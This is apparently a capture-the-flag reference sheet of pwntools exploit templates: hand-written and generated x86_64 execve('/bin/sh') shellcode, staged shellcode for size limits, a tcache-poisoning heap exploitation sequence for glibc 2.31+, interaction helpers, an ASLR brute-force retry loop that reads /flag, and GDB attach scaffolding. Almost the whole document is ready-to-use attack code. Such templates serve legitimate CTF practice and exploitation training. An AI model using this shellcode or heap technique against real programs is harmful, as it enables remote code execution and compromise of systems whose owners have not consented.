# Shellcode, Heap & Interaction Patterns

## Shellcode Templates

### execve("/bin/sh") — x86_64

```python
from pwn import *

context.arch = 'amd64'

# Method 1: pwntools built-in
shellcode = asm(shellcraft.sh())

# Method 2: Custom (shorter, no null bytes)
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
''')

log.info(f'Shellcode length: {len(shellcode)} bytes')
```

### Shellcode with Constraints

```python
# Alphanumeric shellcode (bypass filters)
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
encoded = shellcode  # Use encoder if needed

# Null-free shellcode
shellcode = asm(shellcraft.sh())
assert b'\x00' not in shellcode, "Shellcode contains null bytes!"

# Size-limited shellcode
# If shellcode too big, use staged: read() into rwx page, then jump
stage1 = asm(shellcraft.read(0, 'rsp', 0x200) + shellcraft.ret())
stage2 = asm(shellcraft.sh())
```

## Heap Exploitation Patterns

### Tcache Poisoning (glibc 2.31+)

```python
from pwn import *

def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvline()

# Tcache poisoning: overwrite fd pointer
alloc(0x20, b'AAAA')  # chunk 0
alloc(0x20, b'BBBB')  # chunk 1
free(1)
free(0)

# Overwrite chunk 0's fd → target address
alloc(0x20, p64(target_addr))
alloc(0x20, b'pad')  # Gets freed chunk 1
alloc(0x20, b'WIN')  # Gets target_addr!
```

## Interaction Patterns

### Receive Until Pattern

```python
# Wait for prompt, then send
p.sendlineafter(b'Enter name: ', b'admin')
p.sendlineafter(b'Enter password: ', b'password123')

# Receive exact bytes
data = p.recvn(8)        # Exactly 8 bytes
data = p.recvline()      # Until newline
data = p.recvuntil(b'>') # Until delimiter

# Parse leak from output
p.recvuntil(b'Address: ')
leak = int(p.recvline().strip(), 16)
```

### Retry Loop (for ASLR brute-force)

```python
from pwn import *

for attempt in range(50):
    try:
        p = remote(HOST, PORT)
        # ... exploit code ...
        p.sendline(b'cat /flag*')
        flag = p.recvline_contains(b'flag{')
        log.success(f'Flag: {flag.decode()}')
        break
    except (EOFError, TimeoutError):
        log.warning(f'Attempt {attempt + 1} failed, retrying...')
        p.close()
        continue
```

### GDB Attach for Debugging

```python
def exploit():
    p = process(BINARY)

    if args.GDB:
        gdb.attach(p, gdbscript='''
            b *main+0x42
            b *vuln_func+0x20
            c
        ''')

    # Continue exploit...
    p.interactive()
```
